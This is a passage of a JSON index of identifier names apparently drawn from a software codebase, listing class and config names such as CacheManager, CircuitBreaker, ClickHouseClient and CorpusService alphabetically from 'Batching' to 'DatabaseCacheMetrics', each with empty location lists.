          "category": "identifiers",
          "locations": []
        },
        "Batching": {
          "value": "Batching",
          "category": "identifiers",
          "locations": []
        },
        "BatchingStrategy": {
          "value": "BatchingStrategy",
          "category": "identifiers",
          "locations": []
        },
        "Bearer": {
          "value": "Bearer",
          "category": "identifiers",
          "locations": []
        },
        "BillingEngine": {
          "value": "BillingEngine",
          "category": "identifiers",
          "locations": []
        },
        "Bob": {
          "value": "Bob",
          "category": "identifiers",
          "locations": []
        },
        "Branch": {
          "value": "Branch",
          "category": "identifiers",
          "locations": []
        },
        "BroadcastManager": {
          "value": "BroadcastManager",
          "category": "identifiers",
          "locations": []
        },
        "BroadcastMetrics": {
          "value": "BroadcastMetrics",
          "category": "identifiers",
          "locations": []
        },
        "BroadcastResult": {
          "value": "BroadcastResult",
          "category": "identifiers",
          "locations": []
        },
        "Brown": {
          "value": "Brown",
          "category": "identifiers",
          "locations": []
        },
        "BusinessExpert": {
          "value": "BusinessExpert",
          "category": "identifiers",
          "locations": []
        },
        "BusinessRequirement": {
          "value": "BusinessRequirement",
          "category": "identifiers",
          "locations": []
        },
        "CLIHandler": {
          "value": "CLIHandler",
          "category": "identifiers",
          "locations": []
        },
        "CPUs": {
          "value": "CPUs",
          "category": "identifiers",
          "locations": []
        },
        "CRUDService": {
          "value": "CRUDService",
          "category": "identifiers",
          "locations": []
        },
        "CRUDServiceInterface": {
          "value": "CRUDServiceInterface",
          "category": "identifiers",
          "locations": []
        },
        "CRUDUser": {
          "value": "CRUDUser",
          "category": "identifiers",
          "locations": []
        },
        "CWE-250": {
          "value": "CWE-250",
          "category": "identifiers",
          "locations": []
        },
        "CWE-307": {
          "value": "CWE-307",
          "category": "identifiers",
          "locations": []
        },
        "CWE-326": {
          "value": "CWE-326",
          "category": "identifiers",
          "locations": []
        },
        "CWE-344": {
          "value": "CWE-344",
          "category": "identifiers",
          "locations": []
        },
        "CWE-489": {
          "value": "CWE-489",
          "category": "identifiers",
          "locations": []
        },
        "CWE-613": {
          "value": "CWE-613",
          "category": "identifiers",
          "locations": []
        },
        "Cache": {
          "value": "Cache",
          "category": "identifiers",
          "locations": []
        },
        "Cache-Control": {
          "value": "Cache-Control",
          "category": "identifiers",
          "locations": []
        },
        "CacheClearingStrategy": {
          "value": "CacheClearingStrategy",
          "category": "identifiers",
          "locations": []
        },
        "CacheCompensationHandler": {
          "value": "CacheCompensationHandler",
          "category": "identifiers",
          "locations": []
        },
        "CacheConfig": {
          "value": "CacheConfig",
          "category": "identifiers",
          "locations": []
        },
        "CacheConfiguration": {
          "value": "CacheConfiguration",
          "category": "identifiers",
          "locations": []
        },
        "CacheConstants": {
          "value": "CacheConstants",
          "category": "identifiers",
          "locations": []
        },
        "CacheEntry": {
          "value": "CacheEntry",
          "category": "identifiers",
          "locations": []
        },
        "CacheEvictionManager": {
          "value": "CacheEvictionManager",
          "category": "identifiers",
          "locations": []
        },
        "CacheInvalidation": {
          "value": "CacheInvalidation",
          "category": "identifiers",
          "locations": []
        },
        "CacheKey": {
          "value": "CacheKey",
          "category": "identifiers",
          "locations": []
        },
        "CacheLastKnownFallback": {
          "value": "CacheLastKnownFallback",
          "category": "identifiers",
          "locations": []
        },
        "CacheManager": {
          "value": "CacheManager",
          "category": "identifiers",
          "locations": []
        },
        "CacheMetrics": {
          "value": "CacheMetrics",
          "category": "identifiers",
          "locations": []
        },
        "CacheMetricsBuilder": {
          "value": "CacheMetricsBuilder",
          "category": "identifiers",
          "locations": []
        },
        "CacheRetrieval": {
          "value": "CacheRetrieval",
          "category": "identifiers",
          "locations": []
        },
        "CacheSerializer": {
          "value": "CacheSerializer",
          "category": "identifiers",
          "locations": []
        },
        "CacheStatistics": {
          "value": "CacheStatistics",
          "category": "identifiers",
          "locations": []
        },
        "CacheStorage": {
          "value": "CacheStorage",
          "category": "identifiers",
          "locations": []
        },
        "CacheStrategy": {
          "value": "CacheStrategy",
          "category": "identifiers",
          "locations": []
        },
        "CachedToken": {
          "value": "CachedToken",
          "category": "identifiers",
          "locations": []
        },
        "Caching": {
          "value": "Caching",
          "category": "identifiers",
          "locations": []
        },
        "CapacityPlanningContext": {
          "value": "CapacityPlanningContext",
          "category": "identifiers",
          "locations": []
        },
        "CatalogTools": {
          "value": "CatalogTools",
          "category": "identifiers",
          "locations": []
        },
        "Categories": {
          "value": "Categories",
          "category": "identifiers",
          "locations": []
        },
        "CategorizedLiteral": {
          "value": "CategorizedLiteral",
          "category": "identifiers",
          "locations": []
        },
        "CentralLogger": {
          "value": "CentralLogger",
          "category": "identifiers",
          "locations": []
        },
        "Charlie": {
          "value": "Charlie",
          "category": "identifiers",
          "locations": []
        },
        "Chat": {
          "value": "Chat",
          "category": "identifiers",
          "locations": []
        },
        "ChatAnthropic": {
          "value": "ChatAnthropic",
          "category": "identifiers",
          "locations": []
        },
        "ChatCompletion": {
          "value": "ChatCompletion",
          "category": "identifiers",
          "locations": []
        },
        "ChatOpenAI": {
          "value": "ChatOpenAI",
          "category": "identifiers",
          "locations": []
        },
        "ChatOrchestrator": {
          "value": "ChatOrchestrator",
          "category": "identifiers",
          "locations": []
        },
        "Check": {
          "value": "Check",
          "category": "identifiers",
          "locations": []
        },
        "Checking": {
          "value": "Checking",
          "category": "identifiers",
          "locations": []
        },
        "Checkpoint": {
          "value": "Checkpoint",
          "category": "identifiers",
          "locations": []
        },
        "CheckpointType": {
          "value": "CheckpointType",
          "category": "identifiers",
          "locations": []
        },
        "Chroma": {
          "value": "Chroma",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreaker": {
          "value": "CircuitBreaker",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerConfig": {
          "value": "CircuitBreakerConfig",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerHealthChecker": {
          "value": "CircuitBreakerHealthChecker",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerManager": {
          "value": "CircuitBreakerManager",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerMetrics": {
          "value": "CircuitBreakerMetrics",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerOpenError": {
          "value": "CircuitBreakerOpenError",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerOpenException": {
          "value": "CircuitBreakerOpenException",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerProtocol": {
          "value": "CircuitBreakerProtocol",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerRegistry": {
          "value": "CircuitBreakerRegistry",
          "category": "identifiers",
          "locations": []
        },
        "CircuitBreakerState": {
          "value": "CircuitBreakerState",
          "category": "identifiers",
          "locations": []
        },
        "CircuitConfig": {
          "value": "CircuitConfig",
          "category": "identifiers",
          "locations": []
        },
        "CircuitMetrics": {
          "value": "CircuitMetrics",
          "category": "identifiers",
          "locations": []
        },
        "CircuitState": {
          "value": "CircuitState",
          "category": "identifiers",
          "locations": []
        },
        "CircuitStatus": {
          "value": "CircuitStatus",
          "category": "identifiers",
          "locations": []
        },
        "CircularDependencyError": {
          "value": "CircularDependencyError",
          "category": "identifiers",
          "locations": []
        },
        "Class": {
          "value": "Class",
          "category": "identifiers",
          "locations": []
        },
        "Cleaned": {
          "value": "Cleaned",
          "category": "identifiers",
          "locations": []
        },
        "ClearCacheRequest": {
          "value": "ClearCacheRequest",
          "category": "identifiers",
          "locations": []
        },
        "ClearCacheResponse": {
          "value": "ClearCacheResponse",
          "category": "identifiers",
          "locations": []
        },
        "Cleared": {
          "value": "Cleared",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouse": {
          "value": "ClickHouse",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseClient": {
          "value": "ClickHouseClient",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseConfigInfo": {
          "value": "ClickHouseConfigInfo",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseCredentials": {
          "value": "ClickHouseCredentials",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseDatabaseClient": {
          "value": "ClickHouseDatabaseClient",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseHTTPSConfig": {
          "value": "ClickHouseHTTPSConfig",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseIndexOptimizer": {
          "value": "ClickHouseIndexOptimizer",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseLoggingConfig": {
          "value": "ClickHouseLoggingConfig",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseNativeConfig": {
          "value": "ClickHouseNativeConfig",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseOperationManager": {
          "value": "ClickHouseOperationManager",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseOperations": {
          "value": "ClickHouseOperations",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseQueryError": {
          "value": "ClickHouseQueryError",
          "category": "identifiers",
          "locations": []
        },
        "ClickHouseRollbackExecutor": {
          "value": "ClickHouseRollbackExecutor",
          "category": "identifiers",
          "locations": []
        },
        "ClientMessage": {
          "value": "ClientMessage",
          "category": "identifiers",
          "locations": []
        },
        "ClientToServerMessage": {
          "value": "ClientToServerMessage",
          "category": "identifiers",
          "locations": []
        },
        "CodeQualityMetricsCollector": {
          "value": "CodeQualityMetricsCollector",
          "category": "identifiers",
          "locations": []
        },
        "CodeReviewer": {
          "value": "CodeReviewer",
          "category": "identifiers",
          "locations": []
        },
        "Commands": {
          "value": "Commands",
          "category": "identifiers",
          "locations": []
        },
        "CommunicationCoordinator": {
          "value": "CommunicationCoordinator",
          "category": "identifiers",
          "locations": []
        },
        "CommunicationOverheadValidator": {
          "value": "CommunicationOverheadValidator",
          "category": "identifiers",
          "locations": []
        },
        "CompactAlertManager": {
          "value": "CompactAlertManager",
          "category": "identifiers",
          "locations": []
        },
        "ComparisonMetrics": {
          "value": "ComparisonMetrics",
          "category": "identifiers",
          "locations": []
        },
        "CompensationAction": {
          "value": "CompensationAction",
          "category": "identifiers",
          "locations": []
        },
        "CompensationEngine": {
          "value": "CompensationEngine",
          "category": "identifiers",
          "locations": []
        },
        "CompensationExecutor": {
          "value": "CompensationExecutor",
          "category": "identifiers",
          "locations": []
        },
        "CompensationHandler": {
          "value": "CompensationHandler",
          "category": "identifiers",
          "locations": []
        },
        "CompensationRegistry": {
          "value": "CompensationRegistry",
          "category": "identifiers",
          "locations": []
        },
        "CompensationState": {
          "value": "CompensationState",
          "category": "identifiers",
          "locations": []
        },
        "Complexity": {
          "value": "Complexity",
          "category": "identifiers",
          "locations": []
        },
        "ComplianceConfig": {
          "value": "ComplianceConfig",
          "category": "identifiers",
          "locations": []
        },
        "ComplianceReporter": {
          "value": "ComplianceReporter",
          "category": "identifiers",
          "locations": []
        },
        "ComplianceResults": {
          "value": "ComplianceResults",
          "category": "identifiers",
          "locations": []
        },
        "Component": {
          "value": "Component",
          "category": "identifiers",
          "locations": []
        },
        "ComponentHealth": {
          "value": "ComponentHealth",
          "category": "identifiers",
          "locations": []
        },
        "ComprehensiveDatabaseMetrics": {
          "value": "ComprehensiveDatabaseMetrics",
          "category": "identifiers",
          "locations": []
        },
        "ComprehensiveHealthResponse": {
          "value": "ComprehensiveHealthResponse",
          "category": "identifiers",
          "locations": []
        },
        "CompressionAlgorithm": {
          "value": "CompressionAlgorithm",
          "category": "identifiers",
          "locations": []
        },
        "CompressionAlgorithmHandler": {
          "value": "CompressionAlgorithmHandler",
          "category": "identifiers",
          "locations": []
        },
        "CompressionAlgorithmSelector": {
          "value": "CompressionAlgorithmSelector",
          "category": "identifiers",
          "locations": []
        },
        "CompressionBenchmark": {
          "value": "CompressionBenchmark",
          "category": "identifiers",
          "locations": []
        },
        "CompressionConfig": {
          "value": "CompressionConfig",
          "category": "identifiers",
          "locations": []
        },
        "CompressionResult": {
          "value": "CompressionResult",
          "category": "identifiers",
          "locations": []
        },
        "CompressionStatsManager": {
          "value": "CompressionStatsManager",
          "category": "identifiers",
          "locations": []
        },
        "Conclusion": {
          "value": "Conclusion",
          "category": "identifiers",
          "locations": []
        },
        "ConfidenceLevel": {
          "value": "ConfidenceLevel",
          "category": "identifiers",
          "locations": []
        },
        "ConfidenceManager": {
          "value": "ConfidenceManager",
          "category": "identifiers",
          "locations": []
        },
        "Config": {
          "value": "Config",
          "category": "identifiers",
          "locations": []
        },
        "ConfigBackup": {
          "value": "ConfigBackup",
          "category": "identifiers",
          "locations": []
        },
        "ConfigFieldInfo": {
          "value": "ConfigFieldInfo",
          "category": "identifiers",
          "locations": []
        },
        "ConfigFile": {
          "value": "ConfigFile",
          "category": "identifiers",
          "locations": []
        },
        "ConfigHealthCheck": {
          "value": "ConfigHealthCheck",
          "category": "identifiers",
          "locations": []
        },
        "ConfigReloadResult": {
          "value": "ConfigReloadResult",
          "category": "identifiers",
          "locations": []
        },
        "ConfigService": {
          "value": "ConfigService",
          "category": "identifiers",
          "locations": []
        },
        "ConfigValidationResult": {
          "value": "ConfigValidationResult",
          "category": "identifiers",
          "locations": []
        },
        "ConfigValidationRule": {
          "value": "ConfigValidationRule",
          "category": "identifiers",
          "locations": []
        },
        "Configuration": {
          "value": "Configuration",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationDiagnostics": {
          "value": "ConfigurationDiagnostics",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationError": {
          "value": "ConfigurationError",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationExtractor": {
          "value": "ConfigurationExtractor",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationHistory": {
          "value": "ConfigurationHistory",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationLoader": {
          "value": "ConfigurationLoader",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationManager": {
          "value": "ConfigurationManager",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationResponse": {
          "value": "ConfigurationResponse",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationStatus": {
          "value": "ConfigurationStatus",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationSuggestionRequest": {
          "value": "ConfigurationSuggestionRequest",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationSuggestionResponse": {
          "value": "ConfigurationSuggestionResponse",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationSummary": {
          "value": "ConfigurationSummary",
          "category": "identifiers",
          "locations": []
        },
        "ConfigurationValidator": {
          "value": "ConfigurationValidator",
          "category": "identifiers",
          "locations": []
        },
        "Configured": {
          "value": "Configured",
          "category": "identifiers",
          "locations": []
        },
        "ConnectServerRequest": {
          "value": "ConnectServerRequest",
          "category": "identifiers",
          "locations": []
        },
        "ConnectServerResponse": {
          "value": "ConnectServerResponse",
          "category": "identifiers",
          "locations": []
        },
        "Connected": {
          "value": "Connected",
          "category": "identifiers",
          "locations": []
        },
        "Connection": {
          "value": "Connection",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionCloseReliability": {
          "value": "ConnectionCloseReliability",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionDurationCalculator": {
          "value": "ConnectionDurationCalculator",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionError": {
          "value": "ConnectionError",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionEstablishedMessage": {
          "value": "ConnectionEstablishedMessage",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionEstablishedPayload": {
          "value": "ConnectionEstablishedPayload",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionEstablishmentReliability": {
          "value": "ConnectionEstablishmentReliability",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionExecutionOrchestrator": {
          "value": "ConnectionExecutionOrchestrator",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionExecutor": {
          "value": "ConnectionExecutor",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionInfo": {
          "value": "ConnectionInfo",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionInfoBuilder": {
          "value": "ConnectionInfoBuilder",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionManager": {
          "value": "ConnectionManager",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionMemoryTracker": {
          "value": "ConnectionMemoryTracker",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionMetrics": {
          "value": "ConnectionMetrics",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionOperationBuilder": {
          "value": "ConnectionOperationBuilder",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionPoolReductionStrategy": {
          "value": "ConnectionPoolReductionStrategy",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionReliabilityManager": {
          "value": "ConnectionReliabilityManager",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionState": {
          "value": "ConnectionState",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionStats": {
          "value": "ConnectionStats",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionStatus": {
          "value": "ConnectionStatus",
          "category": "identifiers",
          "locations": []
        },
        "ConnectionValidator": {
          "value": "ConnectionValidator",
          "category": "identifiers",
          "locations": []
        },
        "Connectivity": {
          "value": "Connectivity",
          "category": "identifiers",
          "locations": []
        },
        "Consolidate": {
          "value": "Consolidate",
          "category": "identifiers",
          "locations": []
        },
        "ConstraintViolationError": {
          "value": "ConstraintViolationError",
          "category": "identifiers",
          "locations": []
        },
        "Contains": {
          "value": "Contains",
          "category": "identifiers",
          "locations": []
        },
        "Content-Length": {
          "value": "Content-Length",
          "category": "identifiers",
          "locations": []
        },
        "Content-Security-Policy": {
          "value": "Content-Security-Policy",
          "category": "identifiers",
          "locations": []
        },
        "Content-Type": {
          "value": "Content-Type",
          "category": "identifiers",
          "locations": []
        },
        "ContentCorpus": {
          "value": "ContentCorpus",
          "category": "identifiers",
          "locations": []
        },
        "ContentCorpusGenParams": {
          "value": "ContentCorpusGenParams",
          "category": "identifiers",
          "locations": []
        },
        "ContentGenParams": {
          "value": "ContentGenParams",
          "category": "identifiers",
          "locations": []
        },
        "ContentProcessor": {
          "value": "ContentProcessor",
          "category": "identifiers",
          "locations": []
        },
        "ContentSource": {
          "value": "ContentSource",
          "category": "identifiers",
          "locations": []
        },
        "ContentType": {
          "value": "ContentType",
          "category": "identifiers",
          "locations": []
        },
        "Context": {
          "value": "Context",
          "category": "identifiers",
          "locations": []
        },
        "ConversableAgent": {
          "value": "ConversableAgent",
          "category": "identifiers",
          "locations": []
        },
        "ConversationChain": {
          "value": "ConversationChain",
          "category": "identifiers",
          "locations": []
        },
        "CoreMetricsCollector": {
          "value": "CoreMetricsCollector",
          "category": "identifiers",
          "locations": []
        },
        "CoreServiceBase": {
          "value": "CoreServiceBase",
          "category": "identifiers",
          "locations": []
        },
        "Corpus": {
          "value": "Corpus",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAdminRecoveryStrategy": {
          "value": "CorpusAdminRecoveryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAdminSubAgent": {
          "value": "CorpusAdminSubAgent",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAdminSubAgent-Parser": {
          "value": "CorpusAdminSubAgent-Parser",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAdminTools": {
          "value": "CorpusAdminTools",
          "category": "identifiers",
          "locations": []
        },
        "CorpusApprovalValidator": {
          "value": "CorpusApprovalValidator",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditAction": {
          "value": "CorpusAuditAction",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditLog": {
          "value": "CorpusAuditLog",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditLogger": {
          "value": "CorpusAuditLogger",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditMetadata": {
          "value": "CorpusAuditMetadata",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditRecord": {
          "value": "CorpusAuditRecord",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditReport": {
          "value": "CorpusAuditReport",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditRepository": {
          "value": "CorpusAuditRepository",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditSearchFilter": {
          "value": "CorpusAuditSearchFilter",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAuditStatus": {
          "value": "CorpusAuditStatus",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAutoCompleteRequest": {
          "value": "CorpusAutoCompleteRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusAutoCompleteResponse": {
          "value": "CorpusAutoCompleteResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorpusBase": {
          "value": "CorpusBase",
          "category": "identifiers",
          "locations": []
        },
        "CorpusBatchRequest": {
          "value": "CorpusBatchRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusBatchResponse": {
          "value": "CorpusBatchResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorpusClickHouseOperations": {
          "value": "CorpusClickHouseOperations",
          "category": "identifiers",
          "locations": []
        },
        "CorpusConfigPreview": {
          "value": "CorpusConfigPreview",
          "category": "identifiers",
          "locations": []
        },
        "CorpusCreate": {
          "value": "CorpusCreate",
          "category": "identifiers",
          "locations": []
        },
        "CorpusDiscoveryRequest": {
          "value": "CorpusDiscoveryRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusDiscoveryResponse": {
          "value": "CorpusDiscoveryResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorpusErrorMessage": {
          "value": "CorpusErrorMessage",
          "category": "identifiers",
          "locations": []
        },
        "CorpusGenerationRequest": {
          "value": "CorpusGenerationRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusGenerationResponse": {
          "value": "CorpusGenerationResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorpusInDBBase": {
          "value": "CorpusInDBBase",
          "category": "identifiers",
          "locations": []
        },
        "CorpusIntent": {
          "value": "CorpusIntent",
          "category": "identifiers",
          "locations": []
        },
        "CorpusManager": {
          "value": "CorpusManager",
          "category": "identifiers",
          "locations": []
        },
        "CorpusManagerHandler": {
          "value": "CorpusManagerHandler",
          "category": "identifiers",
          "locations": []
        },
        "CorpusMetadata": {
          "value": "CorpusMetadata",
          "category": "identifiers",
          "locations": []
        },
        "CorpusMetric": {
          "value": "CorpusMetric",
          "category": "identifiers",
          "locations": []
        },
        "CorpusMetricsCollector": {
          "value": "CorpusMetricsCollector",
          "category": "identifiers",
          "locations": []
        },
        "CorpusOperation": {
          "value": "CorpusOperation",
          "category": "identifiers",
          "locations": []
        },
        "CorpusOperationHandler": {
          "value": "CorpusOperationHandler",
          "category": "identifiers",
          "locations": []
        },
        "CorpusOperationRequest": {
          "value": "CorpusOperationRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusOperationResponse": {
          "value": "CorpusOperationResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorpusOperationResult": {
          "value": "CorpusOperationResult",
          "category": "identifiers",
          "locations": []
        },
        "CorpusOperationStatus": {
          "value": "CorpusOperationStatus",
          "category": "identifiers",
          "locations": []
        },
        "CorpusRequestParser": {
          "value": "CorpusRequestParser",
          "category": "identifiers",
          "locations": []
        },
        "CorpusService": {
          "value": "CorpusService",
          "category": "identifiers",
          "locations": []
        },
        "CorpusStatistics": {
          "value": "CorpusStatistics",
          "category": "identifiers",
          "locations": []
        },
        "CorpusStatus": {
          "value": "CorpusStatus",
          "category": "identifiers",
          "locations": []
        },
        "CorpusStreamUpdate": {
          "value": "CorpusStreamUpdate",
          "category": "identifiers",
          "locations": []
        },
        "CorpusToolRequest": {
          "value": "CorpusToolRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusToolResponse": {
          "value": "CorpusToolResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorpusToolType": {
          "value": "CorpusToolType",
          "category": "identifiers",
          "locations": []
        },
        "CorpusType": {
          "value": "CorpusType",
          "category": "identifiers",
          "locations": []
        },
        "CorpusUpdate": {
          "value": "CorpusUpdate",
          "category": "identifiers",
          "locations": []
        },
        "CorpusValidationRequest": {
          "value": "CorpusValidationRequest",
          "category": "identifiers",
          "locations": []
        },
        "CorpusValidationResponse": {
          "value": "CorpusValidationResponse",
          "category": "identifiers",
          "locations": []
        },
        "CorrelationAnalysis": {
          "value": "CorrelationAnalysis",
          "category": "identifiers",
          "locations": []
        },
        "CorrelationAnalyzer": {
          "value": "CorrelationAnalyzer",
          "category": "identifiers",
          "locations": []
        },
        "CostCalculator": {
          "value": "CostCalculator",
          "category": "identifiers",
          "locations": []
        },
        "CostComparison": {
          "value": "CostComparison",
          "category": "identifiers",
          "locations": []
        },
        "CostEstimator": {
          "value": "CostEstimator",
          "category": "identifiers",
          "locations": []
        },
        "CostMetrics": {
          "value": "CostMetrics",
          "category": "identifiers",
          "locations": []
        },
        "CostOptimizationContext": {
          "value": "CostOptimizationContext",
          "category": "identifiers",
          "locations": []
        },
        "CostOptimizer": {
          "value": "CostOptimizer",
          "category": "identifiers",
          "locations": []
        },
        "CostReductionQualityPreservation": {
          "value": "CostReductionQualityPreservation",
          "category": "identifiers",
          "locations": []
        },
        "CostSimulationForIncreasedUsage": {
          "value": "CostSimulationForIncreasedUsage",
          "category": "identifiers",
          "locations": []
        },
        "CostTracker": {
          "value": "CostTracker",
          "category": "identifiers",
          "locations": []
        },
        "Count": {
          "value": "Count",
          "category": "identifiers",
          "locations": []
        },
        "CrashEntry": {
          "value": "CrashEntry",
          "category": "identifiers",
          "locations": []
        },
        "CreateSchema": {
          "value": "CreateSchema",
          "category": "identifiers",
          "locations": []
        },
        "CreateSchemaType": {
          "value": "CreateSchemaType",
          "category": "identifiers",
          "locations": []
        },
        "CreateThreadMessage": {
          "value": "CreateThreadMessage",
          "category": "identifiers",
          "locations": []
        },
        "CreateThreadPayload": {
          "value": "CreateThreadPayload",
          "category": "identifiers",
          "locations": []
        },
        "Created": {
          "value": "Created",
          "category": "identifiers",
          "locations": []
        },
        "Creating": {
          "value": "Creating",
          "category": "identifiers",
          "locations": []
        },
        "CredentialConstants": {
          "value": "CredentialConstants",
          "category": "identifiers",
          "locations": []
        },
        "Critical": {
          "value": "Critical",
          "category": "identifiers",
          "locations": []
        },
        "CrossServiceDataValidator": {
          "value": "CrossServiceDataValidator",
          "category": "identifiers",
          "locations": []
        },
        "CrossServiceValidatorFramework": {
          "value": "CrossServiceValidatorFramework",
          "category": "identifiers",
          "locations": []
        },
        "CurrentSystemState": {
          "value": "CurrentSystemState",
          "category": "identifiers",
          "locations": []
        },
        "Customer": {
          "value": "Customer",
          "category": "identifiers",
          "locations": []
        },
        "DashboardConfig": {
          "value": "DashboardConfig",
          "category": "identifiers",
          "locations": []
        },
        "DataAgent": {
          "value": "DataAgent",
          "category": "identifiers",
          "locations": []
        },
        "DataAgentCache": {
          "value": "DataAgentCache",
          "category": "identifiers",
          "locations": []
        },
        "DataAgentProtocol": {
          "value": "DataAgentProtocol",
          "category": "identifiers",
          "locations": []
        },
        "DataAnalysisRecoveryStrategy": {
          "value": "DataAnalysisRecoveryStrategy",
          "category": "identifiers",
          "locations": []
        },
        "DataAnalysisResponse": {
          "value": "DataAnalysisResponse",
          "category": "identifiers",
          "locations": []
        },
        "DataCatalog": {
          "value": "DataCatalog",
          "category": "identifiers",
          "locations": []
        },
        "DataCopier": {
          "value": "DataCopier",
          "category": "identifiers",
          "locations": []
        },
        "DataEnricher": {
          "value": "DataEnricher",
          "category": "identifiers",
          "locations": []
        },
        "DataExecutionCore": {
          "value": "DataExecutionCore",
          "category": "identifiers",
          "locations": []
        },
        "DataFetchingError": {
          "value": "DataFetchingError",
          "category": "identifiers",
          "locations": []
        },
        "DataFormat": {
          "value": "DataFormat",
          "category": "identifiers",
          "locations": []
        },
        "DataGenerationType": {
          "value": "DataGenerationType",
          "category": "identifiers",
          "locations": []
        },
        "DataIngestionParams": {
          "value": "DataIngestionParams",
          "category": "identifiers",
          "locations": []
        },
        "DataLineage": {
          "value": "DataLineage",
          "category": "identifiers",
          "locations": []
        },
        "DataLogger": {
          "value": "DataLogger",
          "category": "identifiers",
          "locations": []
        },
        "DataOperations": {
          "value": "DataOperations",
          "category": "identifiers",
          "locations": []
        },
        "DataParsingError": {
          "value": "DataParsingError",
          "category": "identifiers",
          "locations": []
        },
        "DataPipeline": {
          "value": "DataPipeline",
          "category": "identifiers",
          "locations": []
        },
        "DataQualityCheck": {
          "value": "DataQualityCheck",
          "category": "identifiers",
          "locations": []
        },
        "DataQualityMetrics": {
          "value": "DataQualityMetrics",
          "category": "identifiers",
          "locations": []
        },
        "DataQualityReport": {
          "value": "DataQualityReport",
          "category": "identifiers",
          "locations": []
        },
        "DataSample": {
          "value": "DataSample",
          "category": "identifiers",
          "locations": []
        },
        "DataSource": {
          "value": "DataSource",
          "category": "identifiers",
          "locations": []
        },
        "DataSourceType": {
          "value": "DataSourceType",
          "category": "identifiers",
          "locations": []
        },
        "DataSubAgent": {
          "value": "DataSubAgent",
          "category": "identifiers",
          "locations": []
        },
        "DataSubAgentCacheManager": {
          "value": "DataSubAgentCacheManager",
          "category": "identifiers",
          "locations": []
        },
        "DataSubAgentClickHouseOperations": {
          "value": "DataSubAgentClickHouseOperations",
          "category": "identifiers",
          "locations": []
        },
        "DataSubAgentExecution": {
          "value": "DataSubAgentExecution",
          "category": "identifiers",
          "locations": []
        },
        "DataSubAgentExecutionEngine": {
          "value": "DataSubAgentExecutionEngine",
          "category": "identifiers",
          "locations": []
        },
        "DataTools": {
          "value": "DataTools",
          "category": "identifiers",
          "locations": []
        },
        "DataValidationError": {
          "value": "DataValidationError",
          "category": "identifiers",
          "locations": []
        },
        "DataValidator": {
          "value": "DataValidator",
          "category": "identifiers",
          "locations": []
        },
        "Database": {
          "value": "Database",
          "category": "identifiers",
          "locations": []
        },
        "DatabaseCacheMetrics": {
          "value": "DatabaseCacheMetrics",
